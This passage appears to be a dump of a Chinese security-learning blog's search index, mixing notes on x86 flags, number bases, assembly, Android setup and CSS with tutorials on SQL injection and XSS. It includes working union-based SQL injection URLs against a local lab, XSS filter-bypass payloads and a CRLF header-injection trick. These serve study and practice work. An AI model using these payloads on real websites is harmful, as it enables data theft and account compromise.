Flag)：PF标志位，根据结果中最低有效字节(最低8位)中“1”的个数来确定置1还是清0。如果“1”的个数为偶数，则PF的值为1，否则其值为0。 解析：这个在很多教材中是错的，这个需要强调根据的是运算结果的最低有效字节，也就是最低8位里面1的个数。 AF辅助进位标志AF(Auxiliary Carry Flag)：如果在“加”操作期间从低半字节（最低四位）到高半字节（高四位）有进位，或者在减法期间的低8位部分从高半字节到低半字节有借位，则将辅助标志设置为（1）。否则，如果不发生这种进位或借位，则清除标志或将其“复位”（设置为0）。—-（维基百科） 辅助迸位标志:算数操作結果的第三位〈从0幵始计数〉如果发生了迸位或者借位則將其置为1,否則为0,常在BCD(binary-codedecimal)算木迄算中被使用。—（百度百科） 解析：这个还是在很多资料上是错误的，在x86汇编上正确解释如上，也就是在D0-D7中，D3向D4位进位或者借位，才会置1。（这个当初老师讲错、百度高赞也是错的，要注意一下）。 ZF零标志ZF(Zero Flag)：零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。解析：引一下常用的xor r8/16/32,r8/16/32对寄存器清零操作。 SF符号标志SF(Sign Flag)：符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。 解析：还是需要确定数据宽度，看好到底哪个是最高位，然后把它换成2进制确定最高位是0还是1.例子： 123MOV AL,20MOV CX,8000ADD AX,CX -w117 这个就是在字上操作，然后相加结果是8020,最高位就是1000，那这个SF就是1了。要注意一下这个sf标志也是看数据宽度的。 OF溢出标志OF(Overflow Flag)：溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。 解析：这个常与CF混淆，以为他们没啥区别，但是这个才是正宗的计算机看是否溢出的标志位。 CF与SF区别： 进位标志表示无符号数运算结果是否超出范围. 溢出标志表示有符号数运算结果是否超出范围. 溢出主要是给有符号运算使用的，在有符号的运算中，有如下的规律： 正 + 正 = 正 如果结果是负数，则说明有溢出 负 + 负 = 负 如果结果是正数，则说明有溢出 正 + 负 永远都不会有溢出. -w315 结合这个图在应为对PF的判断，非常好用。判断的时候，一定注意PF是在有符号数做运算的时候去看的，无符号直接看CF就好了。 练习写汇编指令只影响CF位的值12MOV AL,0FEADD AL,10 -w669 写汇编指令只影响PF位的值12MOV AL,1ADD AL,2 -w630 写汇编指令只影响AF位的值12MOV EAX,0FADD EAX,1 -w588 写汇编指令只影响SF位的值12MOV CL,0F1ADD CL,1 -w716 写汇编指令只影响OF位的值12MOV AL,80SUB AL,10 这个需要重视下，练习的时候有点受思维限制了。没有想到用SUB来构造出，站在80的位置顺时针查10，负-正=正，来实现溢出完成只影响OF位。","categories":[],"tags":[]},{"title":"数据宽度与逻辑运算","slug":"数据宽度与逻辑运算","date":"2019-10-01T13:08:32.000Z","updated":"2019-10-17T15:47:55.000Z","comments":true,"path":"2019/10/01/数据宽度与逻辑运算/","link":"","permalink":"https://chumen77.github.io/2019/10/01/数据宽度与逻辑运算/","excerpt":"","text":"数据宽度与逻辑运算数据宽度数学上的数字，是没有大小限制的，可以无限的大。但在计算机中，由于受硬件的制约，数据都是有长度限制的（我们称为数据宽度），超过最多宽度的数据会被丢弃。 对数据宽度的理解和有无符号数4位宽度表示4位宽度表示：假设计算机只能存储4位2进制数： 0000 0001 0010 0011 0100 0101 0110 0111 1000 1001 1010 1011 1100 1101 1110 1111 0 1 2 3 4 5 6 7 8 9 A B C D E F -w303 存无符号数时：0 1 2 3 4 5 6 7 8 9 A B C D E F 存有符号数时： 正数：0 1 2 3 4 5 6 7 负数：-1 -2 -3 -4 -5 -6 -7 -8 其中对应关系： -1 -2 -3 -4 -5 -6 -7 -8 F E D C B A 9 8 无符号数时：从0到F逆时针依次增大。 有符号数时：含义从圆中间劈开，正数负数各一半，在F处为最大负数，0处为最小的正数。 为什么在存有符号数时说开头为1的数就是负数？我们只看二进制： | 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 || — | — | — | — | — | — | — | — | — || 0000 | 0001 | 0010 | 0011 | 0100 | 0101 | 0110 | 0111 | -1 -2 -3 -4 -5 -6 -7 -8 1111 1110 1101 1100 1011 1010 1001 1000 很明显就可以看出，当二进制开头为1的时候对应存的数值就是负数了。 举例：对1011的理解 1011在我们当做是有符号时就是-5，无符号就是B。这个完全看我们如何去定义。 #### 8位宽度： 8位宽度表示：假设计算机只能存储8位2进制数。 -w315 无符号数：0 1 2 3 4 ……FF 有符号数：正数：0 1 2 3 4 5 6 7 …7F负数： -1 -2 -3 -4 -5 -6 -7 -8 …. -128 FF FE FD FC FB FA F9 F8 …. 80 16位宽度16位宽度表示：假设计算机只能存储16位2进制数 -w317 无符号数：0 1 2 3 4 ……FFFF 有符号数：正数：0 1 2 3 4 5 6 7 …7FFF负数： -1 -2 -3 -4 -5 -6 -7 -8 …. -128 FFFF FFFE FFFD FFFC FFFB FFFA FFF9 FFF8 …. 8000 32位宽度32位宽度表示：假设计算机只能存储32位2进制数 -w378 无符号数：0 1 2 3 4 ……FFFFFFFF 有符号数：正数：0 1 2 3 4 5 6 7 …7FFFFFFF负数： -1 -2 -3 -4 -5 -6 -7 -8 …. -128 FFFFFFFF FFFFFFFE FFFFFFFD FFFFFFFC FFFFFFFB FFFFFFFA FFFFFFF9 FFFFFFF8 …. 80000000 ### 几个本质问题 1：计算机除了0和1什么也不认识。 2：如果存的数据超过数据长度限制，超过的会直接抛弃。 3：有符号数和无符号数是我们自己用的时候定义的，定义是什么就是什么。 ### 几个重要的计量单位： BYTE 字节 8BIT WORD 字 16BIT 2字节 DWORD 双字 32BIT 4字节 逻辑运算二进制的逻辑运算：or：或(or |) 只要有一个为1就是1 -w915 and：与(and &amp;)两个都为1才是1 -w871 xor异或（xor) 不一样为1 -w928 ps：错位了。。。 not非(not !) 1是0 0是1 -w255 逻辑运算的具体应用：想获取某个值得第N位的值是1还是0如：8F 方法：想看下第四位是0还是1，就写个第四个位为1其他都为0的数，然后进行一个与运算，如果出来结果是1.那就证明第四位就是1。 最简单的加密算法：如：要加密的数据：2015密钥：54因为密钥是两位的，所以要对2015分为20和15。 -w279 进行一次xor运算，出来就是加密后的值：74 41当用他俩再进行一次xor运算： -w253 就又变成了2015。这就完成了加密解密。","categories":[],"tags":[]},{"title":"进制学习","slug":"进制学习","date":"2019-09-28T03:52:16.000Z","updated":"2019-10-17T16:01:09.000Z","comments":true,"path":"2019/09/28/进制学习/","link":"","permalink":"https://chumen77.github.io/2019/09/28/进制学习/","excerpt":"","text":"进制学习进制的定义十进制的定义:由十个符号组成，分别是0 1 2 3 4 5 6 7 8 9逢十进一。 九进制的定义:由九个符号组成，分别是0 1 2 3 4 5 6 7 8逢九进一。 十六进制的定义:由十六个符号组成，分别是0 1 2 3 4 5 6 7 8 9 A B C D E F 进制的本质例如十进制：0 1 2 3 4 5 6 7 8 9 其就是由10个符号组成。如果定义其为9 1 5 2 4 7 6 3 8 0,或者换成 -w315 ,如果用上面的符号进行加密与解密，让不懂进制本质的人解密有很大的阻碍。 二进制与十六进制的映射关系 -w911 这个需要背会。 练习正常认知的进制：二进制从0写到100 -w900 七进制编制7进制加法表，乘法表，并计算下面的结果：23456+54356=？5621-654=？234*65=？ -w608 7进制加法表： -w541 7进制乘法表： -w537 粗略计算过程： -w275 本质就是直接查表了。 十六进制：编制16进制加法表，乘法表，并计算下面的结果：2D4E6+CF3A6=？5FD1-E5A=？2CA*A5=？ -w1387 16进制加法： -w1337 16进制乘法表： -w1330 粗略计算过程： -w238 都是查表。 面向本质的非认知进制：一：9进制定义：由9个符号组成，分别是：2、9、1、7、6、5、4、8、3，逢9进1 计算：123 + 234 = ? 先画个进制表： -w489 然后计算： -w154 解题过程:1)最后一位3+4中的4是第6个数，所以3+4 可以看成从3向后数6个为95，取最后一个5且有一个进位2)最后第二位2+3中的2是第0个数，所以2+3相当3，有一个进位，需要再向后查一个是92，取最后一位2且进1位3)第一位1+2中的2是第0个数，所以1+2相当于1，有一个进位，要再向后查一个，再查一位是7，所以最后是725 二：10进制定义：由10个符号组成，分别是：!、@、$、%、^、&amp;、*、A、B、C，逢10进1 计算：@$$B + %AC&amp; = ? 先画个进制表： -w583 然后计算： -w185 解题过程：1)最后一位B+&amp;中的&amp;是第5个数，所以B+&amp;可以看成从B向后数5个为@%，取最后一个%且有一个进位2)最后第二位$+C中的C是第9个数，所以$+C相当从$开始查9个数，前面有一个进位，需要再向后查一个是@$，取最后一位$且进1位3)最后第三位$+A中的A是第7个数，所以$+A相当于从$开始往后查7个，有一个进位，要再向后查一个，再查一位是@!，所以最后是!且进一位4)第一位的@+%中的@是第一个数，所以@+%相当于从%在往后查一位，因为有个进位所以再往后查一位就是&amp;。所以答案就是&amp;!$%。 总结：经过这次对进制的学习和练习，对进制理解更加的深刻，它们只是一堆符号，在达到某个程度后会进位罢了。在复习到c后，有时间可以学习一下写个进制加密的程序。","categories":[],"tags":[]},{"title":"逆向学习-滴水公开课","slug":"逆向学习-滴水公开课","date":"2019-09-27T15:14:39.000Z","updated":"2019-10-17T15:45:30.000Z","comments":true,"path":"2019/09/27/逆向学习-滴水公开课/","link":"","permalink":"https://chumen77.github.io/2019/09/27/逆向学习-滴水公开课/","excerpt":"","text":"逆向学习-滴水公开课知识总结一、内存的读写寻址公式一: [立即数]读取内存的值: MOV EAX,DWORD PTR DS:[0x13FFC4] MOV EAX,DYVORD PTR DS:[0x13FFC8] 向内存中写入数据: MOV DWORD PTR DS:[0x13FFC4],eax MOV DWORD PTR DS:[0x13FFC8].ebx 获取内存编号: LEA EAX,DWORD PTR DS:[0X13FFC4] LEA EAX,DWORD PTR DS:[ESP+8] 寻址公式二: [reg] reg代表寄存器可以是8个通用寄存器中的任意一个读取内存的值:MOV ECX,0x13FFD0 MOV EAX,DWORD PTR DS:[ECX] 向内存中写入数据:MOV EDX,0x13FFD8 MOV DWORD PTR DS:[EDX],0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EDX] MOV EAX,DWORD PTR DS:[EDX] 寻址公式三: [reg+立即数]读取内存的值:MOV ECX,0x13FFD0 MOV EAX,DWORD PTR DS:[ECX+4] 向内存中写入数据:MOV EDX,0x13FFD8 MOV DWORD PTR DS:[EDX+0xC].0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EDX+4] MOV EAX,DWORD PTR DS:[EDX+4] 寻址公式四：[reg+reg*（1 or 2 or 4 or 8）]读取内存的值:MOV EAX,13FFC4 MOV ECX,2 MOV EDX,DWORD PTR DS:[EAX+ECX*4] 向内存中写入数据:MOV EAX,13FFC4 MOV ECX,2 MOV DWORD PTR DS:[EAX+ECX*4],0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EAX+ECX*4] 寻址公式五：[reg+reg*（1 or 2 or 4 or 8）+立即数]读取内存的值:MOV EAX,13FFC4 MOV ECX,2 MOV EDX,DWORD PTR DS:[EAX+ECX*4+4] 向内存中写入数据:MOV EAX,13FFC4 MOV ECX,2 MOV DWORD PTR DS:[EAX+ECX*4+4],0x87654321 获取内存编号:LEA EAX,DWORD PTR DS:[EAX+ECX*4+2] 二、堆栈变形的艺术:push eax代码相当于:lea esp,dword ptr ss:[esp-4] mov dword ptr ss:[esp],eax 或者 mov dword ptr ss:[esp-4],eax lea esp,dword ptr ss:[esp-4] 还有 sub esp,0x4 mov dword ptr ss:[esp],eax push esp代码相当于：mov dword ptr [esp-4],esp sub esp,0x4 还有： mov dword ptr [esp-4],esp lea esp,dword ptr [esp-4] pop eax 代码相当于：lea esp,dword ptr [esp+4] mov eax,dword ptr [esp-4] mov eax,dword ptr [esp] lea esp,dword ptr [esp+4] pop esp 代码相当于：add esp,0x4 mov esp,dword ptr[esp-4]或者 lea esp,dword ptr[esp+4] mov esp,dword ptr[esp-4] 两条简单指令stos ：将eax中的值放入edi所指地址的内存里。 rep ：是重复指令 ecx中放入重复的次数","categories":[],"tags":[]},{"title":"安卓程序分析环境搭建","slug":"安卓程序分析环境搭建","date":"2019-09-23T09:22:24.000Z","updated":"2019-10-17T15:45:31.000Z","comments":true,"path":"2019/09/23/安卓程序分析环境搭建/","link":"","permalink":"https://chumen77.github.io/2019/09/23/安卓程序分析环境搭建/","excerpt":"","text":"#安卓程序分析环境搭建 Mac下安卓SDK搭建：前提是已经安装了homebrew神器： 1：下载SDK12brew search android-sdkbrew cask install android-sdk 2：配置环境变量123vim .zshrcexport ANDROID_SDK_ROOT=&quot;/usr/local/share/android-sdk&quot;export PATH=&quot;$&#123;PATH&#125;:$&#123;ANDROID_SDK_ROOT&#125;/tools:$&#123;ANDROID_SDK_ROOT&#125;/platform-tools&quot; !wq退出以后，source ~/.zshrc 123pwd/usr/local/share/android-sdk/tools/bin./sdkmanager 然后会出现Warning: File /Users/gjy/.android/repositories.cfg could not be loaded.继续touch /Users/gjy/.android/repositories.cfg 3：检验是否搭建好在终端输入：android -w706 这就ok了。 安卓NDK搭建前提是已经安装了homebrew神器： 1：下载NDK：12brew search android-ndkbrew cask install android-ndk 2：配置环境变量：123vim .zshrcexport ANDROID_NDK_HOME=&quot;/usr/local/share/android-ndk&quot; //添加进去正常保存退出source .zshrc 3：检验：ndk-build -w751 已经成功了。","categories":[],"tags":[]},{"title":"SQL注入基础学习","slug":"SQL基础学习","date":"2019-09-01T11:17:25.000Z","updated":"2019-10-24T07:58:10.000Z","comments":true,"path":"2019/09/01/SQL基础学习/","link":"","permalink":"https://chumen77.github.io/2019/09/01/SQL基础学习/","excerpt":"","text":"SQL注入基础学习数据类型（数字型）检测是否sql语句是否执行使用and,or,xor,like测试 ** 1=1 ** 1=2其中**可以为and or xor like任意一个ps：基本语句，注意真假逻辑关系，灵活进行测试。 使用符号测试 单引号 减号 数据类型（字符型）检测是否sql语句是否执行此处跟数字型测试办法基本一样，还是使用and,or,xor,like、单引号测试。最近接触字符型的注入较少，补充一下原理： 我们先进行正常查询：http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&amp;submit=submit当我们给接受处加&#39;：http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39;&amp;submit=submit语句执行后，会产生报错： 然后我们想办法不让其报错，就是来省略后面那个php代码语句加的&#39;: 用#来注释，但需要进行url来转变一下为%23 用--+ --%20来注释然后就可以来用and or xor like来测试了，例如：http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=1--+&amp;submit=submit http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=2--+&amp;submit=submit union知识小记union在集合两个select查询语句时，一定要注意两个查询出来的结果,列数（columns）要相等才会出来结果。例如： SELECT * from news union SELECT 1,2; 报错，换成SELECT * from news union SELECT 1,2,3; order by 知识小记order by是按照一定规则来进行排序的语句。我们为什么能够通过order by排序，来排出来列名有多少个呢？我们来测试一下： SELECT * from test ORDER BY 1;当我们在测试到SELECT * from test ORDER BY 5; 发现出了异常。我们换个3列的表： SELECT * from news ORDER BY 3;显示是正常的SELECT * from news ORDER BY 4;所以可以发现我们在order by后加数字可以来测出来一个表的列名个数。 显示联合查询出现的结果显示我们自定义查询的结果，该怎么实现呢。先在靶场测试：SELECT * FROM news WHERE id = 2 union select 1,2,3 from test 明显网页是不给显示的。相同语句在数据库： 不给显示是因为服务器端php代码进行了处理，只可以显示出一条结果。那如果把第一个查询结果给无法显示，是不是就可以显示我们联合查询的结果呢。先在数据库测试下SQL语句：SELECT * FROM news WHERE id = -1发现是不显示东西的。继续测试:SELECT * FROM news WHERE id = -1 union select 1,2,3 from test; 接着我们拿到靶场测试： 达到我们的目的了。看这个页面显示的效果2 3，反向思维考虑把2 3改成我们的列名是不是就可以出数据了，但是我们如何知道表里的列名呢？ exists（）函数小记exists()是验证某个语句是否存在结果，是个bool函数，存在显示1反之是0。SELECT * FROM news WHERE id=1 and exists(select * from test);在数据库进行测试: SELECT * FROM news WHERE id=1 and exists(select * from aa); 发现在用这个函数查不存在的表的时候语句是没法进行的，然后我们可以通过这个语句来推出表名和列名，不过十分麻烦，可以通过burpsuit来跑。还有意外收获，可以看出数据库的名字 pentest就是数据库的名字了。 数据类型（搜索型）%的作用%在mysql中表示通配符。在SQL语句中:******* like &#39;%a&#39;，就是搜索返回以字母a结尾的所有信息，同理a%``%a%,分别就是 搜索返回以字母a开头的所有信息和搜索返回包含字母a的所有信息。 如何注入咱们先看下php源代码:$sql_search = &quot;SELECT * FROM {$t_name} WHERE {$c_name} like &#39;%{$c_value}%&#39;&quot;; //search很明显提前闭合&#39;%跟省略后面的%&#39;就可以了，所以http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; --+&amp;submit=submit -w804 然后我们正常走步骤，利用order by来确定下多少列：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 3--+&amp;submit=submit继续http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 4--+&amp;submit=submit -w1022 可以确定是3列了。 然后开始确定表名，这次用刚刚学的exist()来测试，并且练习一下burp来跑表名和列名：先正常构造payload：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; and exists(select * from news)--+&amp;submit=submit -w843 确定news表名存在，然后开始用burp跑其他的： -w555 -w837 我们是跑表名，所以在news加上变量。这个步骤需要先点 -w371 然后 -w364 -w531 在“添加“按钮旁的位置开始填入测试的表名，这个我是手动填的，可以进行导入字典。 -w1260 -w778 然后我们开始看结果 -w666 Render下面显示正常就证明是存在的。 -w963 这个是不存在。最终用这个办法可以跑出表名test、account。同样办法跑列名： -w665 -w797 确定出news表中有id、title、content等列。 然后我们更新下语句来查表和列，exists()这个办法是有点老的比较笨。在MySQL&gt;5.1版本中， -w764 我们可以在information_schema发现这个我们的数据库和列名都可以直接看到，所以我们可以以下语句进行查询：第一步，我们先让其可以显示我们想查询的内容http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,2,3 from news--+&amp;submit=submit把标题下的2换成darabase()函数，来显示下数据库的名字。http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,database(),3 from news--+&amp;submit=submit -w982 然后我们就的得到了pentest，然后开始利用这个mysql&gt;5.1特性来构造语句：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit -w902 但是在这里面怎么显示其他的名字呢？ -w523 继续:http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39;--+&amp;submit=submit其中可以将!=换成&lt;&gt;是同样的效果。 -w916 继续在语句中加and和不等于前面查出的表的名字：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39; and table_name&lt;&gt;&#39;news&#39;--+&amp;submit=submit我们发现这样很繁琐，如何能够让一下子全部显示出来呢，用到了group_cancat()函数：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit 然后我们继续去查列名，然后转到infromation_schema的columns下，一直搜索account下滑发现，我们在这个列表下可以拿到更全的信息： -w1162 去对比下account表下的列名信息： -w189 是相对应的，所以我们可以更改下语句：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.columns where table_schema=&#39;pentest&#39;--+&amp;submit=submit -w1012 发现我们还可以拿到这个表名，对比数据库我们也可以按照表名出现的个数看出其表下有多少列。然后我们拿news测试下获取列名：http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;pentest&#39; and table_name=&#39;news&#39;--+&amp;submit=submit -w1049","categories":[],"tags":[]},{"title":"XSS挑战之旅","slug":"XSS挑战之旅","date":"2019-08-20T12:29:45.000Z","updated":"2019-10-17T15:42:25.000Z","comments":true,"path":"2019/08/20/XSS挑战之旅/","link":"","permalink":"https://chumen77.github.io/2019/08/20/XSS挑战之旅/","excerpt":"","text":"XSS挑战之旅关卡第一关payload:&lt;script&gt;alert(1)&lt;/script&gt; 此题没有任何过滤，直接构造语句，在标签之间进行输出。 第二关 此题变成了&lt;input&gt;标签，看到此处后可以考虑，提前闭合掉这个标签，所以构造payload：&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;， 或者也可以payload：&quot; onclick=alert(1)&gt;这个需要点击搜索后，再点击搜索框，属于借助js事件类型。 第三关 变成了单引号的input标签，先尝试闭合input标签这个思路。 发现没有过去，去看下网页代码。 发现其过滤了&lt; &gt;,这样只能通过js事件来构造弹窗。跟上题一样，不过此处是单引号，所以构造payload：&#39; onclick=&#39;alert(1)注意此处的alert(1)的前面还有个单引号，其效果就是value=&#39;&#39; onclick=&#39;alert(1)&#39; 第四关 查看网页源代码，还是跟上题差不多，不过是单引号换成了双引号。按照原来的思路，构造payload：&quot; onclick=&quot;alert(1) 第五关看网页源代码，跟上题一样，直接先测试上题的payload。 &lt;input name=keyword value=&quot;&quot; o_nclick=&quot;alert(1)&quot;&gt;再次查看，可以看出对on进行了过滤，在尝试双写、改变大小写无果后。换思路看看&lt; &gt;是否过滤，发现没有过滤。然后考虑先闭合input标签，然后构造个超链接，点击后调用js事件。payload=&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;然后点击就ok了。 第六关第六关直接测试上题的payload，无法通过，然后看网页源代码：&lt;input name=keyword value=&quot;&quot;&gt; &lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;&quot;&gt;发现href遭到了过滤，结果发现改变大小写可以绕过。payload：&quot;&gt; &lt;a hRef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt; 第七关还是先测试上题的payload，然后查看源代码，发现： href与script直接被替换成了空，然后考虑双写绕过，构造payload：&quot;&gt; &lt;a hrhrefef=&quot;javascriscriptpt:alert(1)&quot;&gt;1&lt;/a&gt; 第八关 发现有些不一样了，然后先点下”添加友情链接“按钮，去看下网页源代码。 会发现这个题是在这个地方来进行xss攻击。先构造payload：javascript:alert(1)，无法通过，然后查看源代码&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascr_ipt:alert(1)&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;可以发现其过滤了字符串script，因为此处为html标记语言，考虑把”r”转换为HTML实体来绕过。构造payload：javasc&amp;#114;ipt:alert(1) 第九关 这题还是跟上题一个类型，但是发现不管加入什么都显示这个。不如加入个正常合法链接试一试，http://www.baidu.com,发现显示正常了，经过测试后发现其在检测到http://后才会正常显示你的代码。所以构造payload：javasc&amp;#114;ipt:alert(1)//http://注意”//“这个是来注释后面的代码的。 第十关 进来以后发现无任何可输入的地方，然后就查看源代码 发现其type类型全是hidden，然后考虑是不是考察这个知识点，在查询后发现大多解决办法就是把hidden，改为text类型。因为在浏览器get到type=”***“，即可把原来的type给替换所以考虑构造payload：&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()然后会出现个输入框，点击后即可过关。此处需要注意的是查看源代码后发现有三个input标签，但实际测试只有最后一个name=&quot;t_sort&quot;才会出现文本框，所以构造了以最后一个标签为攻击点的payload。 第十一关至第十三关这几关都是http头注入需要抓包来完成，基本大差不差的。第十一关 Referer 第十二关 ua 第十三关 cookie 明显是cookie注入了 第十四至最后这几道题基本都是看着别人的博客才做的下来，并且做了感觉不是太明白原理，就先不总结了。以后学到更深的再进行总结。 绕过姿势小补充“()”被过滤用” ` “ 字符了来代替括号。 payload: alert`1` 小进阶 “ ` “ “()”同时被过滤可以使用 &lt;svg&gt; 标签，其有一个特性就是可以执行HTML实体代码。用法是&lt;svg&gt;&amp;#数字;所以构造payload:&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;","categories":[],"tags":[]},{"title":"XSS知识简单学习","slug":"xss学习","date":"2019-08-16T08:21:01.000Z","updated":"2019-08-20T12:40:31.000Z","comments":true,"path":"2019/08/16/xss学习/","link":"","permalink":"https://chumen77.github.io/2019/08/16/xss学习/","excerpt":"","text":"XSS知识简单学习一:Xss简介XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。 ##二：ajax简介ajax其实就是异步JavaScript和xml，其最大优势在于可以实现异步访问。为什么要用AJAX，首先它够隐秘，也就是所谓的“无刷新”，其次，它能更有效地迅速处理各种复杂多变的数据。其可以实现异步更新和跨域。 三：xss漏洞分类存储XSS存储XSS,会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。也就是提交JS攻击代码存储到数据库然后再输出。 用户输入的地方最容易滋生XSS，譬如留言、评论等表单，一个的留言本，因为没有对用户输入的变量作出合适的过滤，导致一个XSS的产生。留言率先传递给管理员，当作javascript劫持，我们就可以利用管理员的权限做任何事情。当内容通过审核，发布到网站，此时所有的web浏览用户都有可能受到XSS，我们能获得更多的会话劫持。 反射型XSS攻击反射型XSS攻击也是非持久型XSS攻击，其是一次性的，仅对当次的页面访问产生影响。非持久型XSS攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的，其是经过服务器的。 其需要黑客进行诱骗使用户访问这个带有xss攻击的链接后，便被JavaScript劫持，收到攻击。 Dom-xss通过URL传入参数所触发，其不与服务器进行通信，但是我们的js攻击代码可以被执行，这是需要分析页面源码然后进行利用，是存在客户端页面的脚本自身中。 四：X-XSS-Protection是浏览器对xxs防护的一个策略，这个可以通过抓包软件，修改头来进行绕过。筒単一句活:header(&quot;X-XSS-Protection: 0&quot;);告泝浏览器禁用XSS保枦 header(&quot;X-XSS-Protection: 1&quot;);告泝浏览器幵宕XSS保枦 五：CRLF响应头注入Location: http://****%0d%0aX-XSS-Protection: 0就是相当于Location: http://**** XSS-Protection: 0这就是一个注入，又添加了一个响应头。但是这种漏洞在php版本&gt;5.1时候是不行的，因为其不允许在HTTP头中出现两个属性。应用场景： php&lt;5.1 碰到了服务器开启xss拦截 六：修补xss漏洞（简单）过滤例如 &gt; &lt; Script等等字眼 转义利用php函数 htmlentities()把字符转换为HTML实体 七：闭合xss当你的js代码被浏览器直接显示出来后，考虑是否是其源码里对你的js代码做了textarea标签处理，然后就需要我们去闭合这个textarea标签，比较通用的就是&#39;&quot;&gt;&lt;/textarea&gt;+js代码 即可。","categories":[],"tags":[]},{"title":"简易解决python2.X与python3.x共存问题","slug":"简易解决python2.X与python3.x共存问题","date":"2019-04-02T15:05:47.000Z","updated":"2019-04-29T14:56:51.000Z","comments":true,"path":"2019/04/02/简易解决python2.X与python3.x共存问题/","link":"","permalink":"https://chumen77.github.io/2019/04/02/简易解决python2.X与python3.x共存问题/","excerpt":"","text":"简易解决python2.X与python3.x共存问题python3.x不兼容Python2.x，语法有许多不同，但很多工具还是需要2.x版本，自己又是初学者，只是跑跑别人的脚本，不会改语法冲突。。。。下面说解决办法。 安装模块Python目前还是需要分开安装 1py -2 -m pip install xxxx 1py -3 -m pip install xxxx 运行脚本分别用py2.x py3.x运行一个1.py的脚本： 1py -2 1.py 1py -3 1.py 或者在1.py的文件代码头加上#! python3 #! python2看个人的情况。 这样就直接输入： 1py 1.py 这只是解决了简单的安装模块和运行脚本的问题。","categories":[],"tags":[]},{"title":"css学习","slug":"css学习","date":"2019-03-30T14:48:12.000Z","updated":"2019-08-04T04:09:51.000Z","comments":true,"path":"2019/03/30/css学习/","link":"","permalink":"https://chumen77.github.io/2019/03/30/css学习/","excerpt":"","text":"CSS如何使用CSSCSS可以通过以下方式添加到HTML中: 内联样式- 在HTML元素中使用”style” 属性 (不推荐使用)； 内部样式表 -在HTML文档头部 &lt;head&gt; 区域使用&lt;style&gt;元素 来包含CSS。 外部引用 - 使用外部 CSS 文件(==推荐使用)== 内联样式应用到个别元素时，就可以使用内联样式。 1&lt;div style=\"color: red;width: 100px; height: 100px; background: yellow\"&gt;苹果&lt;/div&gt; 内部样式表当单个文件需要特别样式时，就可以使用内部样式表。你可以在&lt;head&gt; 部分通过 &lt;style&gt;标签定义内部样式表:。也推荐这样使用便于更改全局。 12345678910&lt;head&gt;&lt;style&gt; div&#123; color: red; width: 100px; height: 100px; background: yellow &#125; &lt;/style&gt;&lt;/head&gt; 注：在头文件写的时候 style还是个开闭标签。 外部样式表用&lt;link&gt;当样式需要被应用到很多页面的时候，外部样式表将是理想的选择。 123&lt;head&gt;&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\"&gt; &lt;/head&gt; 其中“rel=”stylesheet” type=”text/css””这是固定的,”mystyle.css”这是css的地址； 练习：1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;css三种引入方式&lt;/title&gt; &lt;!-- &lt;style&gt; div&#123; color: 